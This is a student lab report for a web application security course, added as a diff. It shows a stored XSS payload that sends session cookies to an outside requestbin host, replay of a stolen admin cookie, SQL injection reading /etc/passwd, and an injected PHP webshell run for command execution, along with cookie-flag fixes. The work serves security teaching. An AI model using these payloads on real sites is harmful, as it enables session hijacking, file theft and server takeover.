@@ -1,0 +1,276 @@
+TDA602/DIT101 AssignmentsLab 3 - Web Application Security
+Fire Group-11, Assignemnt 3
+	1. Himanshu Chuphal ( guschuhi@student.gus.se)
+	2. Raya Altarabulsi ( rayyatar@gmail.com )
+______________________________________________________________________________________________________________
+
+Deliverables:
+
+
+______________________________________________________________________________________________________________
+Part 1: Cross-Site Scripting (XSS)
+Objective- To find an XSS vulnerability to perform a Session Hijacking attack and gain administration clearance in the web application.
+
+1. Describe the XSS vulnerabilitie(s) you found
+Session hijacking, as the name suggests, is all about knowing the session ID (SID) of an active user so that his account can be impersonated or hijacked. 
+After a user enters his credentials, the application tries to identify him only based on his cookie value (which contains the SID).
+Hence, if this SID value of any active user is known to us, we can use the same and login to the application as a victim and thus get access to all of the information. 
+And if session ID is gone, everything is gone!
+
+Session hijacking, sometimes also known as cookie hijacking is the exploitation of a valid computer session — 
+sometimes also called a session key — to gain unauthorized access to information or services in a computer system.
+
+2. A step-by-step description of the attack that you have designed to hijack the administrator session information.
+XSS vulnerabilities:
+Opening the Url in local chrome browser :: http://localhost:80
+Checking Cookie information from Chrome Dev Console -> Applications -> Cookies
+There are two properties in this cookie: HttpOnly (HTTP) and Secure. Their values are blank, meaning not enabled for this cookie.
+That’s where it gets to the point that it’s no longer safe.
+
+</li><script>alert(1);</script><li>
+or
+<script>alert(document.cookie)</script>
+PHPSESSID=55c3lbrlcua52n815ohfds7051; _xsrf=2|fc9f684d|51c0f5105e2614a8dc66b7843da0066d|1555864406
+
+-- HttpOnly cookies are inaccessible to JavaScript's Document.cookie API; they are only sent to the server. 
+For example, cookies that persist server-side sessions don't need to be available to JavaScript, and the HttpOnly flag should be set.
+So in simple terms, if you don’t set the httpOnly flag, then your cookie is readable from the front end JavaScript code.
+
+Open any web page whose cookie doesn’t have the httpOnly flag set. Then open Chrome Dev Console and 
+then tap Console Tab (Cmd + Shift+ J or Ctrl + Shift+ J). Type document.cookie and Enter, and you will see something like this:
+>> document.cookie
+"PHPSESSID=55c3lbrlcua52n815ohfds7051; _xsrf=2|fc9f684d|51c0f5105e2614a8dc66b7843da0066d|1555864406"
+
+As you can see, you get all the cookie info. A JavaScript attacker can simply post this to their own server for later use.
+
+-- Secure Flag instructs the browser that the cookie should only be returned to the application over encrypted connections, that is, an HTTPS connection.
+So, when a cookie is sent to the browser with the flag secure, and when you make a request to the application using HTTP, the browser won’t attach this cookie in the request.
+It will attach it only in an HTTPS request. The HTTPS request will be encrypted so cookies will be safely sent across the network to your application.
+
+Someone can read the cookie in the HTTP request when someone is monitoring all the traffic in the network of customers. 
+They are able to see the clear text data if the request is in HTTP.
+When it’s sent over HTTPS, all data will be encrypted from the browser and sent to the network. The attacker won’t be able to get the raw data you were sending. 
+Nor will the attacker be able to decrypt the content. This is why sending Data over SSL is secure.
+
+Alternatively, checking other ways to do so, we found an open source tool OWASP Zed Attack Proxy Project tool, It can help you automatically find security vulnerabilities in your web applications while you are developing and testing your applications.
+Summary of Alerts has 2 High, 2 Medium and 4 Low alerts (included as pdf ZAP_Scanning_Report.pdf).It contains vulnerabilities described above with more details.
+
+______________________________________________________________________________________________________________
+3. A recommendation on how this issue should be fixed
+There are two properties in this cookie: HttpOnly (HTTP) and Secure. Their values are blank, meaning not enabled for this cookie.
+Setting these properties, this issue should be fixed.
+______________________________________________________________________________________________________________
+4. Include a comprehensive discussion of countermeasures. Give use cases for each countermeasure and discus how they can be deployed for the scenario of the lab:
+	- server-side
+	- client-side
+The administration interface is under the admin link on the main page.
+
+Server side:: requestbin
+As suggested in the Assignemnt page, we used http://requestbin.fullcontact.com/ to send malcicous requests.
+Bin URL:: http://requestbin.fullcontact.com/129mdgv1
+
+Client Side::
+To get the victim's cookie. To do so, we created a comment that include the following payload:
+<script>document.write('<img src="http://requestbin.fullcontact.com/129mdgv1/?'+document.cookie+'  "/>');</script>
+
+Now as the comment is loaded by the victim, the content of the <script> tag will get interpreted and will write (due to the call to document.write) in the page a <img tag with a URL that contains the cookie (due to the concatenation of the cookie by the JavaScript code). 
+The browser will then try to load this image. Since the image's URL contains the cookie, the requestbin server will receive it.
+
+Server side :: 
+Checking the logs of all HTTP requests here:: http://requestbin.fullcontact.com/129mdgv1?inspect#xgzwg9
+
+FORM/POST PARAMETERS
+None
+QUERYSTRING
+PHPSESSID: bk9egv4otj4fe04u7ap5degt61
+
+HEADERS
+Accept-Encoding: gzip
+
+Cloudfront-Forwarded-Proto: http
+
+Host: requestbin.fullcontact.com
+
+Connection: close
+
+Total-Route-Time: 0
+
+Connect-Time: 1
+
+Cloudfront-Viewer-Country: SE
+
+Cloudfront-Is-Smarttv-Viewer: false
+
+Cloudfront-Is-Desktop-Viewer: true
+
+X-Request-Id: 0aabb07f-2e35-40fc-bde2-13a6502ab4d6
+
+Cloudfront-Is-Tablet-Viewer: false
+
+Referer: http://127.0.0.1/post.php?id=2
+
+Cloudfront-Is-Mobile-Viewer: false
+
+Via: 1.1 1405f8b432a21800efb933586c181f09.cloudfront.net (CloudFront), 1.1 vegur
+
+X-Amz-Cf-Id: Egf3CTGedHUN62VYdTslbrmSSOs-hDYnYdPHeo46zRTG70Ify44Bdg==
+
+User-Agent: Mozilla/5.0 (Unknown; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) PhantomJS/1.9.1 Safari/534.34
+
+Accept-Language: en-US,*
+
+Accept: */**/
+
+RAW BODY
+None
+
+
+So, now we get the the cookie of the victim "PHPSESSID: bk9egv4otj4fe04u7ap5degt61", 4th line of the bin URL logs.
+Finally, to get the access to the administration interface, go to Chrome's dev tools to set your cookie to the PHPSESSID takem from BIN URL.
+
+document.cookie = "PHPSESSID=bk9egv4otj4fe04u7ap5degt61"
+
+>document.cookie
+PHPSESSID=bk9egv4otj4fe04u7ap5degt61
+
+Access the administration interface by clicking on the admin link on the main page of localhost:80, we get admin page with following texts:
+
+Administration of my Blog
+Home | Manage post | New post | Logout
+Welcome	edit	delete
+Test	edit	delete
+
+Snapshot is included with report (admin_page_access.jpg)
+______________________________________________________________________________________________________________
+Extra: Can you come up with a possible patch for the website code?
+
+Fix1: The session cookie doesn’t even need to be accessible by the JavaScript client. It’s only needed for the server. We should make it only accessible for the server. 
+It can be done by adding one word (httpOnly) in your set_cookie http response header. Like this:
+
+Set-Cookie: PHPSESSID=55c3lbrlcua52n815ohfds7051; Expires=Wed, 21 June 2019 07:28:00 GMT; HttpOnly
+By adding the httpOnly flag, you are instructing the browser that this cookie should not be read by the JavaScript code. 
+The browser will take care of the rest.
+
+cookie set with httpOnly flag
+Notice the tick mark in the HTTP property. That indicates that httpOnly is enabled.
+
+Now, document.cookie doesn’t return our session cookie. Meaning no JS can read it, including any external scripts.
+>> document.cookie
+""
+If the attacker knows what secure site you're connected to, the idea is that your browser can be tricked into posting to a non-secure version of the same url. At that point your cookie is compromised.
+That's why in addition to httpOnlyCookies you'll want to specify requireSSL="true"
+
+<httpCookies httpOnlyCookies="true" requireSSL="true" />
+
+Fix2 : 
+Just like the httpOnly flag, you just need to add the secure flag in your set_cookie HTTP response header. Like this:
+
+Set-Cookie: PHPSESSID=55c3lbrlcua52n815ohfds7051; Expires=Wed, 21 June 2019 07:28:00 GMT; HttpOnly; Secure
+In Java it can be done in several ways. If you are using Servlet 3.0 or above, then you can configure these settings in web.xml like this:
+	<session-config>
+    	<cookie-config>
+        	<http-only>true</http-only>
+        	<secure>true</secure>
+    	</cookie-config>
+	</session-config>
+If your environment doesn’t support it, then you can add it manually. For example using Servlets you can do this:
+	@Override
+protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
+
+    // perform login checks and other validations
+
+    String sessionid = request.getSession().getId();
+    String contextPath = request.getContextPath();
+    
+    response.setHeader("SET-COOKIE", "JSESSIONID=" + sessionid
+            + "; Path=" + contextPath + "; HttpOnly; Secure");
+
+    response.sendRedirect("/app");
+
+So, after applying Fix1 and Fix2, we should see both the flags HttpOnly; Secure set when we check at client browser.
+
+______________________________________________________________________________________________________________
+______________________________________________________________________________________________________________
+Part 2: SQL Injection
+Objective - to find an SQL-Injection vulnerability in the web application and to exploit in a way that the server makes your requests to the database.
+
+1. A description of all SQL-injection vulnerabilities you've found. What's the root of the problem?
+As explained in Part 1, XSS vulnerability allowed US to gain access to the administration pages. 
+Once in the "Trusted zone", more functionalities are available which lead to more vulnerabilities.
+The FILE privilege allows MySQL users to interact with the filesystem.if we have direct access to the database, 
+we can gather a list of users with this privilege by running the command:
+
+>> SELECT user FROM mysql.user WHERE file_priv='Y';
+
+Now, If the current user has FILE privilege and you have an SQL injection, then we can
+ a. we will be able to read and write file on the system. 
+ b. We will have the same access level as the admin used to run the MySQL server.
+
+______________________________________________________________________________________________________________
+2. Exploit the FILE privilege of the blog user to read the /etc/passwd file.
+Here, we will just retrieve the current user (using the MySQL function user()) using a UNION SELECT:
+We can confirm that we have file access by reading arbitrary files on the system. 
+Using the MySQL function load_file using UNION SELECT we can retrieve the content of /etc/passwd:
+
+http://localhost/admin/edit.php?id=1
+
+Current user:
+http://localhost/admin/edit.php?id=0%20union%20select%201,2,user(),4
+http://localhost/admin/edit.php?id=0%20union%20select%201,2,load_file(%22/etc/passwd%22),4
+
+
+
+Snapshot shared with submission.
+______________________________________________________________________________________________________________
+
+3. Find a writing directory and inject a webshell to get remote execution in the server. Explain the webshell.
+
+Now that we have the current path: /var/www/classes/post.php (/var/www being the default on Debian), we can try to find somewhere the mysql user (default user on Debian) has write-access to.
+
+The best way to do it is to try directories recursively::
+
+/var/www/classes: http://vulnerable/admin/edit.php?id=1%20union%20select%201,2,3,4%20into%20outfile%20%22/var/www/classes/s.php%22
+/var/www/ http://vulnerable/admin/edit.php?id=1%20union%20select%201,2,3,4%20into%20outfile%20%22/var/www/s.php%22
+
+
+If we keep browsing the website and look at the HTML source, we can find a /css directory. 
+When we try it http://vulnerable/admin/edit.php?id=1%20union%20select%201,2,3,4%20into%20outfile%20%22/var/www/css/s.php%22, we can see that a file has been created
+
+
+
+Now that we can create file on the server, we will use this to deploy a Web Shell. The Web Shell will contain some PHP code to run arbitrary command:
+
+<?php 
+system($_GET['c']);
+?>
+We are going to put this PHP code in one of the column of our payload: 
+http://vulnerable/admin/edit.php?id=1%20union%20select%201,2,%22%3C?php%20system($_GET[%27c%27]);%20?%3E%22,4%20into%20outfile%20%22/var/www/css/z.php%22 and create the file on the server.
+
+When we try to access the PHP page and by adding the c parameter for our script
+ http://vulnerable/css/z.php?c=uname%20-a, we get arbitrary command execution:
+______________________________________________________________________________________________________________
+4. A recommendation on how this issue should be fixed.
+Using the fact that the MySQL user had high privileges you were able to gain code execution on the server by deploying a Web Shell through an SQL injection. 
+This shows how defence-in-depth and lowering privileges could have slow down an attacker, and perhaps limit/prevent the full compromise of the server.
+
+______________________________________________________________________________________________________________
+5.Include a comprehensive discussion of countermeasures. Give use cases for each countermeasure and discus how they can be deployed for the scenario of the lab:
+web application itself
+database system
+operating system
+security configuration of the above
+Hint: A possible webshell is <?php system($_GET['c']);?>
+
+
+______________________________________________________________________________________________________________
+Extra: Your admin access might expire in the near future. How can you get future access without changing the administrator password? 
+What do you suggest to mitigate this vulnerability in particular?
+
+
+______________________________________________________________________________________________________________
+
+References:
+1. http://xss-game.appspot.com/
+2. https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)
+3. https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project
+
